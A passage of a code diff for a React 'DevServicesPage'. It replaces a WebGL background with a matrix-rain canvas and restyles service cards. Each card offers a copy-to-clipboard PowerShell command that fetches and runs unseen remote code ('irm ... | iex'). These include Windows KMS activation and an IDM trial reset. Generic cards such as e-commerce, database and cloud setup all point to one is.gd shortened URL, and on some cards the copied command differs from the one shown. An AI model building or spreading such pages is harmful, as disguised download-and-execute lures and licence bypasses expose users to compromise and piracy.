@@ -1,4 +1,3 @@
-
 "use client";
 import { useState, useEffect, useRef } from "react";
 
@@ -285,15 +284,9 @@ export default function DevServicesPage() {
   const [hoveredCard, setHoveredCard] = useState<string | null>(null);
   const [displayedText, setDisplayedText] = useState("");
   const [isTypingComplete, setIsTypingComplete] = useState(false);
+  const [hoverCooldown, setHoverCooldown] = useState(false);
+  const cooldownRef = useRef<NodeJS.Timeout | null>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const glRef = useRef<WebGLRenderingContext | null>(null);
-  const programRef = useRef<WebGLProgram | null>(null);
-  const positionAttributeLocationRef = useRef<number | null>(null);
-  const timeUniformLocationRef = useRef<WebGLUniformLocation | null>(null);
-  const resolutionUniformLocationRef = useRef<WebGLUniformLocation | null>(
-    null
-  );
-  const positionBufferRef = useRef<WebGLBuffer | null>(null);
 
   const copyToClipboard = async () => {
     try {
@@ -350,166 +343,70 @@ export default function DevServicesPage() {
     }
   };
 
+  // Matrix Rain Effect (slowed for comfort)
   useEffect(() => {
     const canvas = canvasRef.current;
     if (!canvas) return;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
 
-    const gl = canvas.getContext("webgl");
-    glRef.current = gl;
-    if (!gl) return;
+    let animationFrameId: number;
+    let width = window.innerWidth;
+    let height = window.innerHeight;
+    let fontSize = 18;
+    let columns = Math.floor(width / fontSize);
+    let drops: number[] = Array(columns).fill(1);
+    const chars =
+      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@!%&*()[]{}<>|/\\-=+_~";
 
-    const setupWebGL = () => {
-      // Vertex shader
-      const vertexShaderSource = `
-        attribute vec2 a_position;
-        void main() {
-          gl_Position = vec4(a_position, 0.0, 1.0);
-        }
-      `;
+    // Each drop will have its own speed for more natural effect
+    let speeds: number[] = Array(columns).fill(0).map(() => 0.5 + Math.random() * 0.7); // 0.5-1.2 px per frame
 
-      // Fragment shader with animated gradient
-      const fragmentShaderSource = `
-        precision mediump float;
-        uniform float u_time;
-        uniform vec2 u_resolution;
-        
-        void main() {
-          vec2 uv = gl_FragCoord.xy / u_resolution.xy;
-          
-          // Create animated gradient
-          float time = u_time * 0.5;
-          vec3 color1 = vec3(0.31, 0.31, 0.67); // indigo
-          vec3 color2 = vec3(0.39, 0.45, 0.55); // slate
-          vec3 color3 = vec3(0.1, 0.1, 0.2);    // midnight
-          
-          float wave1 = sin(uv.x * 3.0 + time) * 0.5 + 0.5;
-          float wave2 = cos(uv.y * 2.0 + time * 0.7) * 0.5 + 0.5;
-          
-          vec3 color = mix(color1, color2, wave1);
-          color = mix(color, color3, wave2 * 0.6);
-          
-          gl_FragColor = vec4(color, 1.0);
-        }
-      `;
-
-      function createShader(type: number, source: string) {
-        const gl = glRef.current;
-        if (!gl) return null;
-
-        const shader = gl.createShader(type);
-        if (!shader) return null;
-
-        gl.shaderSource(shader, source);
-        gl.compileShader(shader);
-
-        if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
-          console.error("Shader compile error:", gl.getShaderInfoLog(shader));
-          gl.deleteShader(shader);
-          return null;
-        }
-
-        return shader;
-      }
-
-      const vertexShader = createShader(gl.VERTEX_SHADER, vertexShaderSource);
-      const fragmentShader = createShader(
-        gl.FRAGMENT_SHADER,
-        fragmentShaderSource
-      );
-
-      if (!vertexShader || !fragmentShader) return;
-
-      const program = gl.createProgram();
-      if (!program) return;
-
-      gl.attachShader(program, vertexShader);
-      gl.attachShader(program, fragmentShader);
-      gl.linkProgram(program);
-
-      if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
-        console.error("Program link error:", gl.getProgramInfoLog(program));
-        return;
-      }
-
-      const positionAttributeLocation = gl.getAttribLocation(
-        program,
-        "a_position"
-      );
-      const timeUniformLocation = gl.getUniformLocation(program, "u_time");
-      const resolutionUniformLocation = gl.getUniformLocation(
-        program,
-        "u_resolution"
-      );
-
-      const positionBuffer = gl.createBuffer();
-      gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
-
-      const positions = [-1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, 1];
-      gl.bufferData(
-        gl.ARRAY_BUFFER,
-        new Float32Array(positions),
-        gl.STATIC_DRAW
-      );
-
-      programRef.current = program;
-      positionAttributeLocationRef.current = positionAttributeLocation;
-      timeUniformLocationRef.current = timeUniformLocation;
-      resolutionUniformLocationRef.current = resolutionUniformLocation;
-      positionBufferRef.current = positionBuffer;
-    };
-
-    setupWebGL();
-
-    function resizeCanvas() {
+    function resize() {
+      width = window.innerWidth;
+      height = window.innerHeight;
       if (!canvas) return;
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-      const gl = glRef.current;
-      if (gl) {
-        gl.viewport(0, 0, canvas.width, canvas.height);
-      }
+      canvas.width = width;
+      canvas.height = height;
+      columns = Math.floor(width / fontSize);
+      drops = Array(columns).fill(1);
+      speeds = Array(columns).fill(0).map(() => 0.5 + Math.random() * 0.7);
     }
 
-    function render(time: number) {
-  const gl = glRef.current;
-  const program = programRef.current;
-  const positionAttributeLocation = positionAttributeLocationRef.current;
-  const timeUniformLocation = timeUniformLocationRef.current;
-  const resolutionUniformLocation = resolutionUniformLocationRef.current;
-  const positionBuffer = positionBufferRef.current;
-  const canvas = canvasRef.current;               // ← added
+    let lastDraw = 0;
+    const frameDelay = 1000 / 24; // ~24fps for less flicker, less strain
 
-  if (
-    !gl ||
-    !program ||
-    positionAttributeLocation === null ||
-    !timeUniformLocation ||
-    !resolutionUniformLocation ||
-    !positionBuffer ||
-    !canvas                                  // ← added to guard
-  )
-    return;
+    function draw(now: number) {
+      if (!ctx) return;
+      if (now - lastDraw < frameDelay) {
+        animationFrameId = requestAnimationFrame(draw);
+        return;
+      }
+      lastDraw = now;
+      ctx.fillStyle = "rgba(15, 23, 42, 0.7)"; // slate-900 with alpha
+      ctx.fillRect(0, 0, width, height);
 
-  gl.clearColor(0.1, 0.1, 0.2, 1);
-  gl.clear(gl.COLOR_BUFFER_BIT);
+      ctx.font = `${fontSize}px monospace`;
+      for (let i = 0; i < columns; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillStyle = "rgba(34, 197, 94, 0.7)"; // emerald-400, more subtle
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
 
-  gl.enableVertexAttribArray(positionAttributeLocation);
-  gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
-  gl.vertexAttribPointer(positionAttributeLocation, 2, gl.FLOAT, false, 0, 0);
+        if (drops[i] * fontSize > height && Math.random() > 0.985) {
+          drops[i] = 0;
+        }
+        drops[i] += speeds[i];
+      }
+      animationFrameId = requestAnimationFrame(draw);
+    }
 
-  gl.uniform1f(timeUniformLocation, time * 0.001);
-  gl.uniform2f(resolutionUniformLocation, canvas.width, canvas.height);
-
-  gl.drawArrays(gl.TRIANGLES, 0, 6);
-  requestAnimationFrame(render);
-}
-
-    resizeCanvas();
-    window.addEventListener("resize", resizeCanvas);
-    requestAnimationFrame(render);
+    resize();
+    window.addEventListener("resize", resize);
+    animationFrameId = requestAnimationFrame(draw);
 
     return () => {
-      window.removeEventListener("resize", resizeCanvas);
+      window.removeEventListener("resize", resize);
+      cancelAnimationFrame(animationFrameId);
     };
   }, []);
 
@@ -557,11 +454,12 @@ export default function DevServicesPage() {
 
   return (
     <div className="min-h-screen relative overflow-hidden bg-slate-900">
-      {/* WebGL Background */}
+      {/* Matrix Rain Background */}
       <canvas
         ref={canvasRef}
         className="absolute inset-0 w-full h-full object-cover"
         style={{ zIndex: 0 }}
+        aria-hidden="true"
       />
 
       {hoveredCard && (
@@ -835,323 +733,467 @@ export default function DevServicesPage() {
             </div>
 
             {/* Feature Grid */}
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-2 gap-6 mb-12 relative">
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-7 mb-12 relative">
               {/* Activate Windows */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-blue-500/20`}
-                onMouseEnter={() => setHoveredCard("windows")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("windows");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <WindowsIcon className="w-8 h-8 text-blue-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Activate Windows
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">KMS activation via</p>
-                <code
-                  className="flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-blue-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors"
-                  onClick={() =>
-                    copyScript("irm https://get.activated.win | iex")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-blue-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <p className="text-gray-300 text-sm mb-4">KMS activation via</p>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-blue-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("irm https://get.activated.win | iex")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-blue-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Reset IDM Trial */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-green-500/20`}
-                onMouseEnter={() => setHoveredCard("idm")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("idm");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <RefreshIcon className="w-8 h-8 text-green-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Reset IDM Trial
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">30-day reset via</p>
-                <code
-                  className="flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-emerald-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors"
-                  onClick={() => copyScript("irm is.gd/idm_reset | iex")}
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-emerald-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <p className="text-gray-300 text-sm mb-4">30-day reset via</p>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-emerald-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() => copyScript("irm is.gd/idm_reset | iex")}
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-emerald-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Download Office Deployment Tool */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-orange-500/20`}
-                onMouseEnter={() => setHoveredCard("office")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("office");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <PackageIcon className="w-8 h-8 text-orange-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Office Deployment Tool
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   Direct <code className="text-orange-400">.exe</code> grab from
                   Microsoft CDN
                 </p>
-                <code
-                  className="text-xs flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-orange-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors-slate-900/50 px-2 py-1 rounded text-blue-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-orange-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-orange-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-orange-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* E-commerce Store Setup */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-blue-500/20`}
-                onMouseEnter={() => setHoveredCard("ecommerce")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("ecommerce");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <ShoppingCartIcon className="w-8 h-8 text-amber-800" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   E-commerce Setup
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   WooCommerce + Stripe integration
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-amber-800 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors-1 rounded font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-amber-800 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-amber-800 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-amber-800 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Database Management */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-purple-500/20`}
-                onMouseEnter={() => setHoveredCard("database")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("database");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <DatabaseIcon className="w-8 h-8 text-purple-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Database Tools
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   MySQL, PostgreSQL, MongoDB setup
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-purple-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors text-purple-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-purple-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-purple-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-purple-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* API Development Kit */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-yellow-500/20`}
-                onMouseEnter={() => setHoveredCard("api")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("api");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <LightningIcon className="w-8 h-8 text-yellow-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   API Dev Kit
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   REST & GraphQL scaffolding
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-yellow-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors rounded text-yellow-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-yellow-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-yellow-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-yellow-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Cloud Services */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-cyan-500/20`}
-                onMouseEnter={() => setHoveredCard("cloud")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("cloud");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <CloudIcon className="w-8 h-8 text-cyan-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Cloud Deploy
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   AWS, Azure, GCP automation
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-aqua-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors text-cyan-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-aqua-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-cyan-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-aqua-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Docker & Containers */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-blue-500/20`}
-                onMouseEnter={() => setHoveredCard("docker")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("docker");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <ContainerIcon className="w-8 h-8 text-blue-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Container Stack
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   Docker, K8s, compose templates
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-blue-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors text-blue-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-blue-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-blue-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-blue-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
               {/* Security Tools */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-red-500/20`}
-                onMouseEnter={() => setHoveredCard("security")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("security");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <ShieldIcon className="w-8 h-8 text-red-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Security Suite
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   SSL, firewall, vulnerability scan
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex rounded text-flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-pink-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-pink-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-pink-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-pink-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Monitoring & Analytics */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-green-500/20`}
-                onMouseEnter={() => setHoveredCard("analytics")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("analytics");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <ChartIcon className="w-8 h-8 text-green-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Analytics Hub
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
